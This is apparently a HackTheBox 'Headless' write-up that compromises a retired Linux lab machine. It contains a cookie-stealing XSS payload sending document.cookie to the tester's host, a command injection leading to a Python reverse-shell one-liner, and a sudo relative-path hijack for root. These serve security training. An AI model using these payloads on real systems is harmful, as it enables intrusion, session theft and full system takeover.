<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dawnl3ss :: Headless HTB Write-Up</title>

    <meta property="og:title" content="Dawnless | Headless HTB Write-Up">
    <meta property="og:description" content="Headless HackTheBox Write-Up by Dawnl3ss. XSS cookie theft + Command Injection + sudo PATH hijack.">
    <meta content="Dawnless" name="author">

    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Fira+Code:wght@300;400;500;600&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/MaterialDesign-Webfont/7.4.47/css/materialdesignicons.min.css">
    <link rel="stylesheet" href="/public/css/components/wtpage.css">
</head>
<body>

<header class="header" id="header">
    <div class="container">
        <nav class="nav">
            <a href="/" class="nav-logo">
                <img src="/public/img/icon.jpg" alt="Dawnl3ss">
                <div class="logo-text">dawnl3ss<span>@parrot</span></div>
            </a>
            <ul class="nav-list" id="navList">
                <li><a href="/" class="nav-link">Home</a></li>
                <li><a href="/writeups" class="nav-link">Writeups</a></li>
                <li><a href="#recon" class="nav-link">Recon</a></li>
                <li><a href="#access" class="nav-link">Access</a></li>
                <li><a href="#privesc" class="nav-link">PrivEsc</a></li>
            </ul>
            <button class="nav-toggle" id="navToggle" aria-label="Toggle menu">
                <span></span><span></span><span></span>
            </button>
        </nav>
    </div>
</header>

<section class="writeup-hero">
    <div class="container hero-inner">
        <div class="breadcrumb">
            <a href="/"><i class="mdi mdi-home"></i> Home</a>
            <i class="mdi mdi-chevron-right"></i>
            <a href="/writeups">Writeups</a>
            <i class="mdi mdi-chevron-right"></i>
            <span>Headless</span>
        </div>

        <div class="writeup-banner">
            <img
                class="box-avatar"
                src="https://labs.hackthebox.com/storage/avatars/26e076db204a74b99390e586d7ebcf8c.png"
                alt="Headless HTB"
            >
            <div class="writeup-meta">
                <h1>HTB - <span>Headless</span> Write-Up</h1>
                <div class="meta-row">
                    <span class="meta-badge difficulty-easy"><i class="mdi mdi-circle-slice-8"></i> Easy</span>
                    <span class="meta-badge os-linux"><i class="mdi mdi-linux"></i> Linux</span>
                    <span class="meta-badge type-web"><i class="mdi mdi-web"></i> Web App</span>
                    <span class="meta-badge platform"><i class="mdi mdi-flag-checkered"></i> HackTheBox</span>
                </div>
                <div class="tag-list">
                    <span class="tag">ctf</span>
                    <span class="tag">web</span>
                    <span class="tag">xss</span>
                    <span class="tag">command-injection</span>
                    <span class="tag">python</span>
                    <span class="tag">path-hijack</span>
                </div>
            </div>
        </div>
    </div>
</section>

<div class="writeup-layout">

    <aside class="toc-sidebar">
        <nav class="toc-box">
            <p class="toc-title"><i class="mdi mdi-format-list-bulleted"></i> Contents</p>
            <ul class="toc-list">
                <li><a href="#intro"><i class="mdi mdi-information-outline"></i> Introduction</a></li>
                <li><a href="#recon"><i class="mdi mdi-radar"></i> Reconnaissance</a></li>
                <li><a href="#access"><i class="mdi mdi-console"></i> Getting a Shell</a></li>
                <li><a href="#privesc"><i class="mdi mdi-crown-outline"></i> Privilege Escalation</a></li>
            </ul>
        </nav>
    </aside>

    <main class="writeup-content">

        <section class="wt-section" id="intro">
            <div class="section-heading">
                <div class="heading-icon"><i class="mdi mdi-information-outline"></i></div>
                <div>
                    <span class="section-num">01 /</span>
                    <h2>Introduction</h2>
                </div>
            </div>

            <p>
                <a href="https://app.hackthebox.com/machines/594" target="_blank">Headless</a> is a retired machine on HackTheBox.
                The objective is to compromise the target and capture both the user and root flags.
            </p>

            <div class="box-info-card">
                <div class="box-info-item">
                    <i class="mdi mdi-flag-variant"></i>
                    <span class="bi-label">Name</span>
                    <span class="bi-value">Headless</span>
                </div>
                <div class="box-info-item">
                    <i class="mdi mdi-gauge"></i>
                    <span class="bi-label">Difficulty</span>
                    <span class="bi-value" style="color:#22c55e">Easy</span>
                </div>
                <div class="box-info-item">
                    <i class="mdi mdi-linux"></i>
                    <span class="bi-label">OS</span>
                    <span class="bi-value">Linux</span>
                </div>
                <div class="box-info-item">
                    <i class="mdi mdi-web"></i>
                    <span class="bi-label">Type</span>
                    <span class="bi-value">Web App</span>
                </div>
            </div>

            <p>Let's dive into the challenge!</p>
        </section>

        <section class="wt-section" id="recon">
            <div class="section-heading">
                <div class="heading-icon"><i class="mdi mdi-radar"></i></div>
                <div>
                    <span class="section-num">02 /</span>
                    <h2>Reconnaissance</h2>
                </div>
            </div>

            <p>I started by adding the machine IP to <code class="inline">/etc/hosts</code>:</p>

            <div class="terminal-block">
                <div class="tb-header">
                    <div class="tb-dots"><span></span><span></span><span></span></div>
                    <span class="tb-label">hosts setup</span>
                    <button class="tb-copy" data-target="cmd1">copy</button>
                </div>
                <pre id="cmd1"><span class="prompt">$</span> <span class="cmd">sudo echo '{MACHINE-IP} headless.htb' >> /etc/hosts</span></pre>
            </div>

            <p>Then I ran a full NMAP scan to enumerate open ports:</p>

            <div class="terminal-block">
                <div class="tb-header">
                    <div class="tb-dots"><span></span><span></span><span></span></div>
                    <span class="tb-label">nmap scan results</span>
                    <button class="tb-copy" data-target="cmd2">copy</button>
                </div>
                <pre id="cmd2"><span class="output">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-05 10:25 CEST
Nmap scan report for headless.htb (10.10.11.8)
Host is up (0.020s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
<span class="success">22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)</span>
| ssh-hostkey:
|   256 90:02:94:28:3d:ab:22:74:df:0e:a3:b2:0f:2b:c6:17 (ECDSA)
|_  256 2e:b9:08:24:02:1b:60:94:60:b3:84:a9:9e:1a:60:ca (ED25519)
<span class="success">5000/tcp open  upnp?</span>
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200 OK
<span class="highlight">|     Server: Werkzeug/2.2.2 Python/3.11.2</span>
<span class="warning">|     Set-Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs; Path=/</span>

Nmap done: 1 IP address (1 host up) scanned in 105.57 seconds</span></pre>
            </div>

            <div class="callout warning">
                <i class="mdi mdi-cookie-alert-outline"></i>
                <p>A Werkzeug app is running on port <strong>5000</strong>. The NMAP scan already reveals an interesting <code class="inline">is_admin</code> cookie in the HTTP response headers.</p>
            </div>

            <p>Directory fuzzing with FFUF revealed two interesting endpoints:</p>

            <div class="terminal-block">
                <div class="tb-header">
                    <div class="tb-dots"><span></span><span></span><span></span></div>
                    <span class="tb-label">ffuf - directory enumeration</span>
                    <button class="tb-copy" data-target="cmd3">copy</button>
                </div>
                <pre id="cmd3"><span class="success">/support    -> HTTP 200 OK</span>
<span class="warning">/dashboard  -> HTTP 500 (access denied without admin cookie)</span></pre>
            </div>

            <p>
                Analyzing the <code class="inline">/support</code> page, the POST form also sends the <code class="inline">is_admin</code> cookie in the request headers.
                This hints at a potential XSS vector to steal an admin's cookie.
            </p>
        </section>

        <section class="wt-section" id="access">
            <div class="section-heading">
                <div class="heading-icon"><i class="mdi mdi-console"></i></div>
                <div>
                    <span class="section-num">03 /</span>
                    <h2>Getting a Shell</h2>
                </div>
            </div>

            <p>I fired up Burp Suite to intercept requests and started a Python HTTP server on port 8000 to catch the stolen cookie:</p>

            <div class="terminal-block">
                <div class="tb-header">
                    <div class="tb-dots"><span></span><span></span><span></span></div>
                    <span class="tb-label">http server - cookie catcher</span>
                    <button class="tb-copy" data-target="cmd4">copy</button>
                </div>
                <pre id="cmd4"><span class="prompt">┌─[dawnl3ss@parrot]─[~/Neptune/Security/CTF/HTB/Headless]
└──╼ [★]$</span> <span class="cmd">python3 -m http.server 8000</span>
<span class="output">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span></pre>
            </div>

            <div class="writeup-img-wrap">
                <img src="/public/img/htb/headless/burp1.png" alt="Burp Suite request capture">
                <div class="img-overlay"><i class="mdi mdi-magnify-plus-outline"></i></div>
                <div class="img-caption">// Burp Suite - intercepted /support request</div>
            </div>

            <p>I injected an XSS payload into the form via Burp Suite, targeting the <code class="inline">User-Agent</code> header to have it reflected back to the admin bot:</p>

            <div class="terminal-block">
                <div class="tb-header">
                    <div class="tb-dots"><span></span><span></span><span></span></div>
                    <span class="tb-label">XSS payload</span>
                    <button class="tb-copy" data-target="cmd5">copy</button>
                </div>
                <pre id="cmd5"><span class="comment"># Inject in User-Agent or form field:</span>
<span class="cmd">&lt;img src=x onerror=fetch('http://10.10.14.15:8000/'+document.cookie)&gt;</span></pre>
            </div>

            <p>The server callback came in almost immediately with the admin cookie:</p>

            <div class="terminal-block">
                <div class="tb-header">
                    <div class="tb-dots"><span></span><span></span><span></span></div>
                    <span class="tb-label">stolen admin cookie</span>
                    <button class="tb-copy" data-target="cmd6">copy</button>
                </div>
                <pre id="cmd6"><span class="output">10.10.11.8 - - [30/Apr/2024 07:34:14] "GET /is_admin=<span class="success">ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0</span> HTTP/1.1" 404 -</span></pre>
            </div>

            <div class="callout success">
                <i class="mdi mdi-key-variant"></i>
                <p>Admin cookie obtained: <code class="inline">is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0</code></p>
            </div>

            <p>I used Burp Suite to replay a request to <code class="inline">/dashboard</code> with the stolen cookie:</p>

            <div class="terminal-block">
                <div class="tb-header">
                    <div class="tb-dots"><span></span><span></span><span></span></div>
                    <span class="tb-label">HTTP GET /dashboard - with stolen cookie</span>
                    <button class="tb-copy" data-target="cmd7">copy</button>
                </div>
                <pre id="cmd7"><span class="cmd">GET /dashboard HTTP/1.1
Host: headless.htb:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
<span class="success">Cookie: is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0</span>
Upgrade-Insecure-Requests: 1</span></pre>
            </div>

            <div class="writeup-img-wrap">
                <img src="/public/img/htb/headless/burp2.png" alt="Burp Suite dashboard response">
                <div class="img-overlay"><i class="mdi mdi-magnify-plus-outline"></i></div>
                <div class="img-caption">// Burp Suite - /dashboard response with admin cookie</div>
            </div>

            <div class="writeup-img-wrap">
                <img src="/public/img/htb/headless/dashboard3.png" alt="Admin dashboard">
                <div class="img-overlay"><i class="mdi mdi-magnify-plus-outline"></i></div>
                <div class="img-caption">// Headless - admin dashboard</div>
            </div>

            <p>The dashboard exposes a "Generate Report" feature. Analyzing the POST request, the <code class="inline">date</code> parameter is passed unsanitized to a shell command - classic command injection!</p>

            <div class="writeup-img-wrap">
                <img src="/public/img/htb/headless/burpsuite4.png" alt="Command injection vector">
                <div class="img-overlay"><i class="mdi mdi-magnify-plus-outline"></i></div>
                <div class="img-caption">// Burp Suite - date parameter command injection</div>
            </div>

            <div class="callout info">
                <i class="mdi mdi-code-braces"></i>
                <p>Appending <code class="inline">;id</code> after the date value confirms RCE - output shows we are running as user <strong>dvir</strong>.</p>
            </div>

            <div class="writeup-img-wrap">
                <img src="/public/img/htb/headless/burpsuite5.png" alt="RCE confirmation">
                <div class="img-overlay"><i class="mdi mdi-magnify-plus-outline"></i></div>
                <div class="img-caption">// RCE confirmed - running as dvir</div>
            </div>

            <p>I escalated to a full reverse shell using a Python one-liner:</p>

            <div class="terminal-block">
                <div class="tb-header">
                    <div class="tb-dots"><span></span><span></span><span></span></div>
                    <span class="tb-label">reverse shell payload (URL-encoded)</span>
                    <button class="tb-copy" data-target="cmd8">copy</button>
                </div>
                <pre id="cmd8"><span class="cmd">python3+-c+'import+socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.15",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("sh")'</span></pre>
            </div>

            <div class="writeup-img-wrap">
                <img src="/public/img/htb/headless/burpsuite6.png" alt="Reverse shell trigger">
                <div class="img-overlay"><i class="mdi mdi-magnify-plus-outline"></i></div>
                <div class="img-caption">// Burp Suite - reverse shell trigger via date parameter</div>
            </div>

            <div class="terminal-block">
                <div class="tb-header">
                    <div class="tb-dots"><span></span><span></span><span></span></div>
                    <span class="tb-label">netcat - reverse shell received</span>
                    <button class="tb-copy" data-target="cmd9">copy</button>
                </div>
                <pre id="cmd9"><span class="prompt">┌─[dawnl3ss@parrot]─[~/Neptune/Security/CTF/HTB/Headless]
└──╼ [★]$</span> <span class="cmd">nc -lnvp 4444</span>
<span class="output">listening on [any] 4444 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.11.8] 50324
$ id
<span class="success">uid=1000(dvir) gid=1000(dvir) groups=1000(dvir),100(users)</span>
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
<span class="success">dvir@headless:~/app$</span>

dvir@headless:~/app$</span> <span class="cmd">cd ~ && cat user.txt</span>
<span class="success">REDACTED</span></pre>
            </div>

            <div class="callout success">
                <i class="mdi mdi-flag"></i>
                <p><strong>User flag captured!</strong> Shell obtained as <strong>dvir</strong>. Time to escalate to root.</p>
            </div>
        </section>

        <section class="wt-section" id="privesc">
            <div class="section-heading">
                <div class="heading-icon"><i class="mdi mdi-crown-outline"></i></div>
                <div>
                    <span class="section-num">04 /</span>
                    <h2>Privilege Escalation</h2>
                </div>
            </div>

            <p>First step: check sudo permissions for the current user.</p>

            <div class="terminal-block">
                <div class="tb-header">
                    <div class="tb-dots"><span></span><span></span><span></span></div>
                    <span class="tb-label">sudo -l</span>
                    <button class="tb-copy" data-target="cmd10">copy</button>
                </div>
                <pre id="cmd10"><span class="prompt">dvir@headless:~/app$</span> <span class="cmd">sudo -l</span>
<span class="output">Matching Defaults entries for dvir on headless:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin,
    use_pty

User dvir may run the following commands on headless:
<span class="success">    (ALL) NOPASSWD: /usr/bin/syscheck</span></span></pre>
            </div>

            <div class="callout warning">
                <i class="mdi mdi-alert-outline"></i>
                <p><code class="inline">dvir</code> can execute <code class="inline">/usr/bin/syscheck</code> as root without a password. Let's inspect its source.</p>
            </div>

            <div class="terminal-block">
                <div class="tb-header">
                    <div class="tb-dots"><span></span><span></span><span></span></div>
                    <span class="tb-label">/usr/bin/syscheck - source code</span>
                    <button class="tb-copy" data-target="cmd11">copy</button>
                </div>
                <pre id="cmd11"><span class="prompt">dvir@headless:~/app$</span> <span class="cmd">cat /usr/bin/syscheck</span>
<span class="output">#!/bin/bash

if [ "$EUID" -ne 0 ]; then
  exit 1
fi

last_modified_time=$(/usr/bin/find /boot -name 'vmlinuz*' -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1)
formatted_time=$(/usr/bin/date -d "@$last_modified_time" +"%d/%m/%Y %H:%M")
/usr/bin/echo "Last Kernel Modification Time: $formatted_time"

disk_space=$(/usr/bin/df -h / | /usr/bin/awk 'NR==2 {print $4}')
/usr/bin/echo "Available disk space: $disk_space"

load_average=$(/usr/bin/uptime | /usr/bin/awk -F'load average:' '{print $2}')
/usr/bin/echo "System load average: $load_average"

if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
  /usr/bin/echo "Database service is not running. Starting it..."
<span class="warning">  ./initdb.sh 2>/dev/null</span>
else
  /usr/bin/echo "Database service is running."
fi

exit 0</span></pre>
            </div>

            <div class="callout info">
                <i class="mdi mdi-lightbulb-outline"></i>
                <p>
                    The script calls <code class="inline">./initdb.sh</code> using a <strong>relative path</strong> - meaning it looks for <code class="inline">initdb.sh</code> in whatever the current working directory is.
                    By injecting <code class="inline">/tmp</code> at the front of <code class="inline">$PATH</code> and placing a malicious <code class="inline">initdb.sh</code> there, we can execute arbitrary code as root.
                </p>
            </div>

            <p>Let's exploit this PATH hijack:</p>

            <div class="terminal-block">
                <div class="tb-header">
                    <div class="tb-dots"><span></span><span></span><span></span></div>
                    <span class="tb-label">PATH hijack - root shell</span>
                    <button class="tb-copy" data-target="cmd12">copy</button>
                </div>
                <pre id="cmd12"><span class="comment"># Prepend /tmp to PATH so our script is found first</span>
<span class="prompt">dvir@headless:~/app$</span> <span class="cmd">export PATH=/tmp:$PATH</span>

<span class="comment"># Move to /tmp and create the malicious initdb.sh</span>
<span class="prompt">dvir@headless:~/app$</span> <span class="cmd">cd /tmp</span>
<span class="prompt">dvir@headless:/tmp$</span> <span class="cmd">echo '/bin/bash -p' > initdb.sh</span>
<span class="prompt">dvir@headless:/tmp$</span> <span class="cmd">chmod 777 initdb.sh</span>

<span class="comment"># Trigger syscheck as root from /tmp</span>
<span class="prompt">dvir@headless:/tmp$</span> <span class="cmd">sudo syscheck</span>
<span class="output">Last Kernel Modification Time: 01/02/2024 10:05
Available disk space: 1.9G
System load average:  0.01, 0.05, 0.03
Database service is not running. Starting it...

<span class="success"># id</span>
<span class="success">uid=0(root) gid=0(root) groups=0(root)</span>

# cat /root/root.txt
<span class="success">REDACTED</span></span></pre>
            </div>

            <div class="callout success">
                <i class="mdi mdi-crown"></i>
                <p><strong>Root flag captured!</strong> Box fully pwned via XSS -> Command Injection -> sudo PATH hijack. 💀</p>
            </div>
        </section>

    </main>
</div>

<footer class="footer">
    <div class="container footer-content">
        <div class="footer-social">
            <a href="https://github.com/dawnl3ss/" target="_blank"><i class="mdi mdi-github"></i></a>
            <a href="https://discord.gg/hardware" target="_blank"><i class="mdi mdi-discord"></i></a>
            <a href="http://dawnl3ss.me/" target="_blank"><i class="mdi mdi-web"></i></a>
            <a href="https://twitter.com/dawnl3ss" target="_blank"><i class="mdi mdi-twitter"></i></a>
        </div>
        <nav class="footer-nav">
            <a href="/">Home</a>
            <a href="/writeups">Writeups</a>
            <a href="mailto:dawnl3ss@protonmail.com">Contact</a>
        </nav>
        <p class="footer-copyright">Copyright Dawnl3ss © 2025 - <span style="color:var(--primary)">dawnl3ss@parrot-sec</span></p>
    </div>
</footer>

<div class="lightbox-overlay" id="lightbox">
    <button class="lightbox-close" id="lightboxClose">&times;</button>
    <img class="lightbox-img" id="lightboxImg" src="" alt="">
</div>
<script src="/public/js/wtpage.js"></script>
</body>
</html>